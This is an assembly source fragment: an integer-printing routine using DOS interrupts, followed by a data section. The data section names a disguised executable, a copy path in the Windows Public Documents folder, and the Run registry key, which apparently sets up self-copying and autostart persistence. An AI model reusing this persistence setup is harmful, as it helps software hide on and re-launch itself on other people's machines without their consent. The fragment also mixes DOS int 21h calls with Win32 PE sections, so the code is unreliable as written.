section '.code' executable
    test    ax, ax
    jns  @OutNeg
    mov  cx, ax
    mov     ah, 02h
    mov     dl, '-'
    int     21h
    mov  ax, cx
    neg     ax
@OutNeg:  
    xor     cx, cx
    mov     bx, 10
@OutLoopFirst:
    xor     dx,dx
    div     bx
    push    dx
    inc     cx
    test    ax, ax
    jnz     @OutLoopFirst
    mov     ah, 02h
@OutLoopSec:
    pop     dx
    add     dl, '0'
    int     21h
    loop    @OutLoopSec
    ret

section '.data' readable writeable
  msg_thread dd ?
  hkey dd ?
  oldFile db 'b#AD_aPx2lE.exe',0
  newFile db 'C:\Users\Public\Documents\b#AD_aPx2lE.exe',0
  szFile db '"C:\Users\Public\Documents\b#AD_aPx2lE.exe" --high', 0
  AutoKey db 'Software\Microsoft\Windows\CurrentVersion\Run',0
  ValueName db 'b#AD_aPx2lE',0  